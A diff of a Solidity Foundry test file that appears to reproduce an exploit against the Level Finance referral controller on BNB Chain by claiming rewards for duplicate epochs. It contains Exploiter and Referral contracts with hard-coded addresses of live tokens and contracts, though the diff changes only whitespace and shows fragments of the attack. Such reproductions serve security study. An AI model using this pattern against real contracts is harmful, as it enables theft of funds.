@@ -14,6 +14,7 @@ import "./../interface.sol";
 // Lack of checking for duplicate elements in arrays
 
 interface IPool {
+
     function swap(
         address _tokenIn,
         address _tokenOut,
@@ -21,9 +22,11 @@ interface IPool {
         address _to,
         bytes calldata extradata
     ) external;
+
 }
 
 interface ILevelReferralControllerV2 {
+
     struct UserInfo {
         uint256 tier;
         uint256 tradingPoint;
@@ -38,9 +41,11 @@ interface ILevelReferralControllerV2 {
     function claimable(uint256 _epoch, address _user) external view returns (uint256);
     function setEnableNextEpoch(bool _enable) external;
     function nextEpoch() external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 LVL = IERC20(0xB64E280e9D1B5DbEc4AcceDb2257A87b400DB149);
@@ -129,9 +134,11 @@ contract ContractTest is Test {
         LevelReferralControllerV2.claimMultiple(_epoches, address(this));
         exploiter.claimMultiple(amount);
     }
+
 }
 
 contract Exploiter {
+
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IPool pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);
@@ -164,13 +171,16 @@ contract Exploiter {
         }
         LevelReferralControllerV2.claimMultiple(_epoches, msg.sender);
     }
+
 }
 
 contract Referral {
+
     ILevelReferralControllerV2 LevelReferralControllerV2 =
         ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
 
     constructor(address _referrer) {
         LevelReferralControllerV2.setReferrer(_referrer);
     }
+
 }
